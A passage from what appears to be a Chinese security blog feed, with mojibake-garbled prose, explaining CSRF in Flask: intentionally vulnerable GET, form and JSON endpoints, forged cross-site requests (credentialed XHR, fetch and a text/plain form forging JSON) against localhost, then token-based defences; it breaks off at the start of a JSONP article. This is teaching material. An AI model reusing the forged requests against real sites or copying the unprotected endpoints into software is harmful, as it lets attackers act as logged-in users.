href="http://127.0.0.1:8888/login?user=adminæ¨¡æ‹Ÿç”¨æˆ·adminç™»é™†ï¼Œä»ä»£ç å¯ä»¥çœ‹åˆ°ç™»é™†åç½‘ç«™å°†ç”¨æˆ·èº«ä»½ï¼ˆç®€å•èµ·è§å°±æ˜¯ç”¨æˆ·åï¼‰ä¿å­˜åˆ°sessionä¸­ã€‚" target="_blank" rel="noopener">http://127.0.0.1:8888/login?user=adminæ¨¡æ‹Ÿç”¨æˆ·adminç™»é™†ï¼Œä»ä»£ç å¯ä»¥çœ‹åˆ°ç™»é™†åç½‘ç«™å°†ç”¨æˆ·èº«ä»½ï¼ˆç®€å•èµ·è§å°±æ˜¯ç”¨æˆ·åï¼‰ä¿å­˜åˆ°sessionä¸­ã€‚</a><br><img src="/csrf-CSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549283807815.png" alt="1549283807815"></p><p>æ¥ç€è®¿é—®<a href="http://127.0.0.1:8888/getå¯ä»¥çœ‹åˆ°ç”¨æˆ·å…·æœ‰è¿™ä¸€æƒé™ï¼Œå¯ä»¥è¿›è¡Œæ“ä½œï¼ˆå‡è®¾è¿™ä¸€é“¾æ¥æ˜¯ä¸€ä¸ªå…³é”®æ“ä½œï¼Œå¦‚é‡ç½®å¯†ç æˆ–æ³„éœ²å…¶ä»–æ•æ„Ÿä¿¡æ¯çš„æ“ä½œï¼‰ã€‚" target="_blank" rel="noopener">http://127.0.0.1:8888/getå¯ä»¥çœ‹åˆ°ç”¨æˆ·å…·æœ‰è¿™ä¸€æƒé™ï¼Œå¯ä»¥è¿›è¡Œæ“ä½œï¼ˆå‡è®¾è¿™ä¸€é“¾æ¥æ˜¯ä¸€ä¸ªå…³é”®æ“ä½œï¼Œå¦‚é‡ç½®å¯†ç æˆ–æ³„éœ²å…¶ä»–æ•æ„Ÿä¿¡æ¯çš„æ“ä½œï¼‰ã€‚</a></p><p><img src="/csrf-CSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549284215038.png" alt="1549284215038"></p><h3 id="æ”»å‡»æ–¹æ³•"><a href="#æ”»å‡»æ–¹æ³•" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h3><p>å¦‚æœç”¨æˆ·è®¿é—®äº†æ¶æ„ç½‘é¡µï¼Œæ¶æ„ç½‘é¡µè¯±å¯¼ç”¨æˆ·è®¿é—®<a href="http://127.0.0.1:8888/getæˆ–æ˜¯ç”¨jså‘é€ä¸€ä¸ªgetè¯·æ±‚ï¼Œé‚£ä¹ˆç”¨æˆ·ç”±äºsessionIDè¿˜å­˜åœ¨äºæµè§ˆå™¨ä¸­ï¼Œå› æ­¤ä¼šåœ¨æ— æ„é—´ä½¿ç”¨è‡ªå·±çš„èº«ä»½é‡ç½®å¯†ç ï¼Œå¦‚ç”¨äºè®¿é—®äº†å¦‚ä¸‹å†…å®¹çš„ç½‘é¡µï¼š" target="_blank" rel="noopener">http://127.0.0.1:8888/getæˆ–æ˜¯ç”¨jså‘é€ä¸€ä¸ªgetè¯·æ±‚ï¼Œé‚£ä¹ˆç”¨æˆ·ç”±äºsessionIDè¿˜å­˜åœ¨äºæµè§ˆå™¨ä¸­ï¼Œå› æ­¤ä¼šåœ¨æ— æ„é—´ä½¿ç”¨è‡ªå·±çš„èº«ä»½é‡ç½®å¯†ç ï¼Œå¦‚ç”¨äºè®¿é—®äº†å¦‚ä¸‹å†…å®¹çš„ç½‘é¡µï¼š</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"GET"</span>, <span class="string">"http://127.0.0.1:8888/get"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">    xhr.send();</span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">        if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°½ç®¡åŒæºç­–ç•¥å¯¼è‡´jsæ‹¿ä¸åˆ°ç»“æœï¼Œä½†æ˜¯è¯·æ±‚ä»ç„¶ä¼šæ­£å¸¸å‘é€ï¼š</p><p><img src="/csrf-CSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549284680614.png" alt="1549284680614"></p><h2 id="POST-è¡¨å•å‹"><a href="#POST-è¡¨å•å‹" class="headerlink" title="POST è¡¨å•å‹"></a>POST è¡¨å•å‹</h2><h3 id="è„†å¼±ä»£ç -1"><a href="#è„†å¼±ä»£ç -1" class="headerlink" title="è„†å¼±ä»£ç "></a>è„†å¼±ä»£ç </h3><p>æœ‰äººè®¤ä¸ºCSRFäº§ç”Ÿçš„åŸå› æ˜¯å› ä¸ºGETè¯·æ±‚ç±»å‹é€ æˆçš„ï¼Œå…¶å®ä¸ç„¶ï¼Œå¦‚ä¸‹å°±æ˜¯ä¸€ä¸ªPOSTç±»å‹çš„ä»£ç ï¼Œå®ƒåŒæ ·å­˜åœ¨CSRFé—®é¢˜ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/post', methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        template=<span class="string">"""</span></span><br><span class="line"><span class="string">        &lt;form action="http://127.0.0.1:8888/reset" method="POST"&gt;</span></span><br><span class="line"><span class="string">        &lt;input name="action" type="text"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="submit"&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(request.form)</span><br><span class="line">        data=request.form[<span class="string">"action"</span>]</span><br><span class="line">        print(<span class="string">"session:"</span>,session)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            print(<span class="string">"Admin do"</span>, data)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Admin do "</span>+data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"No Privilege2..."</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No Privilege2..."</span></span><br></pre></td></tr></table></figure></p><h3 id="æ”»å‡»æ–¹æ³•-1"><a href="#æ”»å‡»æ–¹æ³•-1" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h3><p>æ”»å‡»è€…åªéœ€è¦åŒæ ·çš„ä¼ªé€ POSTè¡¨å•å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬æ¢ç”¨<code>fetch()</code>è¯•ä¸€ä¸‹ï¼Œå½“ç„¶<code>XMLHttpRequest()</code>ä¹Ÿå¯ä»¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'http://127.0.0.1:8888/post'</span>,&#123;<span class="attr">method</span>: <span class="string">'POST'</span>, <span class="attr">credentials</span>: <span class="string">'include'</span>, <span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>&#125;, <span class="attr">body</span>:<span class="string">'action=reset+password'</span>&#125;)</span><br></pre></td></tr></table></figure><p>å°½ç®¡åŒæºå†ä¸€æ¬¡æ²¡è®©æˆ‘ä»¬æ‹¿åˆ°ç»“æœï¼Œä½†æ˜¯è¯·æ±‚è¿˜æ˜¯å‘è¿‡å»äº†ï¼š</p><p><img src="/csrf-CSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549285932946.png" alt="1549285932946"></p><h2 id="POST-JSONå‹"><a href="#POST-JSONå‹" class="headerlink" title="POST JSONå‹"></a>POST JSONå‹</h2><p>å¦‚æœæœåŠ¡å™¨ä¸¥æ ¼é™åˆ¶äº†<code>Content-Type=application/json</code>ï¼Œç†è®ºä¸Šæ˜¯ä¸å­˜åœ¨CSRFçš„ï¼Œå› ä¸ºè¯¥è¯·æ±‚å±äºéç®€å•è¯·æ±‚ï¼Œéç®€å•è¯·æ±‚ä¼šå‘å…ˆæ£€è¯·æ±‚ç¡®è®¤æ˜¯å¦å…è®¸è·¨åŸŸï¼Œå¦‚æœä¸å…è®¸è·¨åŸŸçš„è¯jså°±æ²¡æ³•ä½¿ç”¨cookieã€‚</p><p>ä½†æ˜¯è‹¥æœåŠ¡å™¨ä¸åˆ¤æ–­content-typeï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨è¡¨å•æˆ–æ˜¯jsä¼ªé€ ä¸€ä¸ª<code>Content-Type=text/plain</code>çš„è¯·æ±‚ã€‚</p><h3 id="è„†å¼±ä»£ç -2"><a href="#è„†å¼±ä»£ç -2" class="headerlink" title="è„†å¼±ä»£ç "></a>è„†å¼±ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json', methods=['GET','POST','OPTIONS'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_json</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        template=<span class="string">"""</span></span><br><span class="line"><span class="string">        &lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">        function submitRequest() &#123;</span></span><br><span class="line"><span class="string">            var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">            xhr.open("POST", "http://127.0.0.1:8888/json", true);</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Accept", "*/*");</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");</span></span><br><span class="line"><span class="string">            xhr.withCredentials = true;</span></span><br><span class="line"><span class="string">            xhr.send(JSON.stringify(&#123;"action":"change passwd..."&#125;));</span></span><br><span class="line"><span class="string">            xhr.onreadystatechange = function()&#123;</span></span><br><span class="line"><span class="string">                if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span></span><br><span class="line"><span class="string">                    alert(xhr.responseText);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick="submitRequest()"&gt;Conform&lt;/button&gt;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            data=json.loads(request.get_data(as_text=<span class="literal">True</span>))</span><br><span class="line">            ret=<span class="string">'Admin do '</span>+data[<span class="string">"action"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret=<span class="string">"No Privilege2..."</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h3 id="æ”»å‡»æ–¹æ³•-2"><a href="#æ”»å‡»æ–¹æ³•-2" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h3><ol><li><p>ä½¿ç”¨è¡¨å•ä¼ªé€ postï¼Œå…³é”®æ˜¯ç”¨nameå­—æ®µæ„é€ ä¸€ä¸ªåˆæ³•çš„jsonï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8888/json"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"action":"change passwd...", "test":"'</span> <span class="attr">value</span>=<span class="string">'test"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨jsä¼ªé€ post json</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'http://127.0.0.1:8888/json'</span>,&#123;<span class="attr">method</span>: <span class="string">'POST'</span>, <span class="attr">credentials</span>: <span class="string">'include'</span>, <span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;, <span class="attr">body</span>:<span class="string">'&#123;"action":"reset password"&#125;'</span>&#125;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>ä¸»è¦æœ‰ä¸¤ç§æ‰‹æ®µï¼š</p><ol><li>æ ¹æ®Refereråˆ¤æ–­ï¼Œä½†æ˜¯è¦è€ƒè™‘æ²¡æœ‰refererå­—æ®µçš„æƒ…å†µ</li><li>å¢åŠ ä¸€ä¸ªéšæœºçš„Tokenï¼Œå‰ç«¯å‘é€åï¼Œåç«¯æ¯”è¾ƒæ˜¯å¦ä¸€è‡´ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»è¿™ä¸€ç§æ–¹æ³•</li></ol><h2 id="GETå‹-1"><a href="#GETå‹-1" class="headerlink" title="GETå‹"></a>GETå‹</h2><p>åœ¨äº§ç”ŸGETè¯·æ±‚çš„åœ°æ–¹å°±åŠ ä¸€ä¸ªcsrf_tokenï¼Œåœ¨å¤„ç†getè¯·æ±‚æ—¶åˆ¤æ–­csrf_tokenä¸cookieæˆ–sessionä¸­çš„tokenæ˜¯å¦ä¸€è‡´ã€‚</p><h2 id="POSTè¡¨å•å‹"><a href="#POSTè¡¨å•å‹" class="headerlink" title="POSTè¡¨å•å‹"></a>POSTè¡¨å•å‹</h2><p>å¯¹äºflaskï¼Œä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf.csrf <span class="keyword">import</span> CSRFProtect</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'you never guess'</span></span><br><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>æ‰“å¼€csrfä¿æŠ¤ï¼Œæ¥ç€å†å¯¹æ‰€æœ‰çš„è¡¨å•æ·»åŠ ä¸€ä¸ªéšè—å­—æ®µå³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; csrf_token() &#125;&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>å¢åŠ éšè—å­—æ®µåï¼Œæ¯æ¬¡POSTæ—¶éƒ½ä¼šå¸¦æœ‰ä¸€ä¸ªcsrf_tokenï¼Œæ”»å‡»è€…ç”±äºåŒæºç­–ç•¥æ˜¯æ— æ³•è·å–è¿™ä¸ªtokençš„ï¼Œå¦å¤–tokenå†™è¿›sessioné‡Œé¢ï¼Œå³sessionå’Œtokenæ˜¯ä¸€å¯¹ä¸€å…³ç³»ï¼Œå› æ­¤æ”»å‡»è€…ä¹Ÿæ— æ³•é€šè¿‡è‡ªå·±çš„tokençŒœæµ‹åˆ«äººçš„tokenï¼Œè€ŒæœåŠ¡å™¨å†POSTè¯·æ±‚è¿‡æ¥æ—¶å°±ä¼šéªŒè¯è¿™ä¸ªtokenæ˜¯å¦ä¸sessionä¸€è‡´ï¼Œè‹¥ä¸ä¸€è‡´åˆ™æ‹’ç»æœåŠ¡ï¼Œè¿™æ ·ä¸€æ¥æ”»å‡»è€…å°±æ— æ³•æ”»å‡»æˆåŠŸäº†ï¼ˆé™¤äº†æŠŠtokenæ”¾è¡¨å•é‡Œï¼Œè¿˜å¯ä»¥æ”¾cookieé‡Œï¼Œæ”»å‡»è€…ä»ç„¶æ— æ³•è·å–ï¼‰</p><h2 id="POSTJSONå‹"><a href="#POSTJSONå‹" class="headerlink" title="POSTJSONå‹"></a>POSTJSONå‹</h2><p>ç†è®ºä¸Šä¸¥æ ¼æ§åˆ¶<code>content-type: application/json</code>å°±èƒ½è§£å†³é—®é¢˜ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨é€šç”¨æ–¹æ³•ï¼š</p><p>åŒæ ·è¿˜æ˜¯å…ˆå¼€å¯CSRFé˜²å¾¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf.csrf <span class="keyword">import</span> CSRFProtect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'random_secret_key'</span></span><br><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>è®©è‡ªå·±ç«™çš„ajaxæ‹¿åˆ°csrf_tokenï¼Œå°±åƒä¹‹å‰è¯´çš„ï¼Œå°†tokenæ”¾è¿›cookieé‡Œï¼Œä½¿ç”¨app.after_requestä¿®é¥°ä½¿å¾—æ¯ä¸ªé¡µé¢è¿”å›æ—¶éƒ½æ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after_request</span><span class="params">(response)</span>:</span></span><br><span class="line">    <span class="comment"># è°ƒç”¨å‡½æ•°ç”Ÿæˆ csrf_token</span></span><br><span class="line">    csrf_token = generate_csrf()</span><br><span class="line">    <span class="comment"># é€šè¿‡ cookie å°†å€¼ä¼ ç»™å‰ç«¯</span></span><br><span class="line">    response.set_cookie(<span class="string">"csrf_token"</span>, csrf_token)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>æ¥ç€ajaxä»cookieæ‹¿åˆ°tokenå¹¶æ”¾åˆ°headersé‡Œï¼Œä¸ç”¨æ‹…å¿ƒæ”»å‡»è€…ï¼Œå› ä¸ºç”±äºåŒæºç­–ç•¥ï¼Œä»–ä»¬æ²¡æ³•è·å–å…¶ä»–ç½‘ç«™çš„cookieï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json2', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json2</span><span class="params">()</span>:</span></span><br><span class="line">    template = <span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Normal&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt; Reset Password &lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">    $(document).ready(function()&#123;</span></span><br><span class="line"><span class="string">      $("button").click(function()&#123;</span></span><br><span class="line"><span class="string">        // bodyä¸º"data=json"çš„è¯·æ±‚</span></span><br><span class="line"><span class="string">        // var data = &#123;data: JSON.stringify(&#123;"action": "reset password"&#125;)&#125;</span></span><br><span class="line"><span class="string">        // bodyç›´æ¥ä¸ºjson</span></span><br><span class="line"><span class="string">        var data = JSON.stringify(&#123;"action": "reset password"&#125;)</span></span><br><span class="line"><span class="string">        $.ajax(&#123;</span></span><br><span class="line"><span class="string">            url:"http://127.0.0.1:8888/json",</span></span><br><span class="line"><span class="string">            contentType: "application/json",</span></span><br><span class="line"><span class="string">            headers:&#123;'X-CSRFToken':$.cookie('csrf_token')&#125;,</span></span><br><span class="line"><span class="string">            dataType: "json",</span></span><br><span class="line"><span class="string">            type: 'POST',</span></span><br><span class="line"><span class="string">            data: data,</span></span><br><span class="line"><span class="string">            success: function (msg) &#123;</span></span><br><span class="line"><span class="string">                        alert(msg.status);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;button&gt;Conform&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>CSRF-Scannerâ€”â€”æ‰“é€ å…¨è‡ªåŠ¨æ£€æµ‹CSRFæ¼æ´åˆ©å™¨ï¼Œ<a href="https://security.tencent.com/index.php/blog/msg/24" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/24</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> CSRF </tag>
            
            <tag> é˜²å¾¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSONPåŸç†åŠå…¶å®‰å…¨æ€§é—®é¢˜</title>
      <link href="/jsonp-JSONP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/"/>
      <url>/jsonp-JSONP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="JSONPåŸç†"><a href="#JSONPåŸç†" class="headerlink" title="JSONPåŸç†"></a>JSONPåŸç†</h1><p>JSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§è·¨åŸŸè·å–æ•°æ®çš„æ–¹æ³•ï¼Œå› ä¸ºå¸¦<code>src</code>å±æ€§çš„æ ‡ç­¾å¦‚<code>&lt;script&gt;</code>å…è®¸è·¨åŸŸï¼ˆ1. åœ¨CSPæ²¡æœ‰è®¾ç½®çš„æƒ…å†µä¸‹, 2.è·¨åŸŸæ—¶æ˜¯å¯ä»¥å¸¦cookieçš„ï¼‰ï¼Œå› æ­¤å‰ç«¯å¯ä»¥è®¾ç½®ä¸€ä¸ªcallbackè¯·æ±‚å¹¶ç”Ÿæˆä¸€ä¸ªè®¿é—®åå°æŸä¸ª<code>&lt;script&gt;</code>çš„é“¾æ¥ï¼Œåå°åœ¨é“¾æ¥ä¸­åŠ¨æ€çš„å°†æ•°æ®åŒ…è£¹åœ¨å…ˆå‰çš„callbackå‡½æ•°ä¸­ï¼Œä½œä¸ºå‚æ•°è¿”å›ç»™å‰å°ï¼Œè¿™æ ·å°±å®Œæˆäº†è·¨åŸŸè·å–æ•°æ®çš„æ•ˆæœã€‚</p><a id="more"></a><h2 id="ç®€å•ç¤ºä¾‹"><a href="#ç®€å•ç¤ºä¾‹" class="headerlink" title="ç®€å•ç¤ºä¾‹"></a>ç®€å•ç¤ºä¾‹</h2><h3 id="åå°"><a href="#åå°" class="headerlink" title="åå°"></a>åå°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">'random_secret_key'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/remote.js', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote</span><span class="params">()</span>:</span></span><br><span class="line">    _id=int(request.args.get(<span class="string">"id"</span>))</span><br><span class="line">    <span class="comment"># fetch data from database...</span></span><br><span class="line">    user=[</span><br><span class="line">        dict(username=<span class="string">"zhangsan"</span>,stat=<span class="string">"student"</span>),</span><br><span 